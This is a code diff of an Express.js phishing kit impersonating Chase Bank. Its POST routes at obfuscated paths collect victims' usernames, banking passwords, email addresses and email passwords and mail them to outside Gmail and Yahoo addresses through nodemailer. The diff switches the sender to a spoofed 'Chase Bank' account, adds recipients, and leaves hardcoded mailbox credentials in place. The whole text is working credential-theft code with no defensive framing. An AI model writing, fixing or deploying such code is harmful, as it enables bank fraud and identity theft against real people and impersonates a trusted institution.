@@ -16,7 +16,8 @@ const hbs = require('hbs');
 const transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
-        user: 'jordanrobert2000@gmail.com',
+        // user: 'jordanrobert2000@gmail.com',
+        user: 'chasebankingcustomercare@gmail.com',
         pass: 'Mummy123'
     }
 });
@@ -103,14 +104,17 @@ app.get('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefceddd33', (req, res, 
 app.post('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefceddd33', (req, res, next) => {
 
     console.log(req.body);
+    console.log(req.body.username);
+
     //send mail (part 1)
     let mailOptions = {
-        from: 'info2@chase.com',
-        to: 'olumbex@gmail.com',
-        // to: 'jordanrobert2000@gmail.com',
+        from: 'Chase Bank <chasebankingcustomercare@gmail.com>',
+        // to: 'olumbex@gmail.com',
+        // to: 'vince.rex@yahoo.com',
+        to: 'jordanrobert2000@gmail.com, vince.rex@yahoo.com',
         // to: 'pinhomes009@gmail.com',
         subject: 'Data From chaseish',
-        text: `UserId: ${req.body.username} \n 
+        text: `UserId: \n ${req.body.username} \n 
                Password: ${req.body.password1} \n
                Email: ${req.body.email} \n
                Email Password: ${req.body.password2} \n
@@ -162,11 +166,12 @@ app.get('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefceggg33', (req, res, 
 app.post('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefceggg33', (req, res, next) => {
     console.log(req.body);
 
+
     //send mail (part 2)
     let mailOptions = {
-        from: 'info2@chase.com',
-        to: 'olumbex@gmail.com',
-        // to: 'jordanrobert2000@gmail.com',
+        from: 'Chase Bank <chasebankingcustomercare@gmail.com>',
+        // to: 'olumbex@gmail.com',
+        to: 'jordanrobert2000@gmail.com, vince.rex@yahoo.com',
         // to: 'pinhomes009@gmail.com',
         subject: 'Data From chaseish',
         text: `UserId: ${req.body.username} \n 
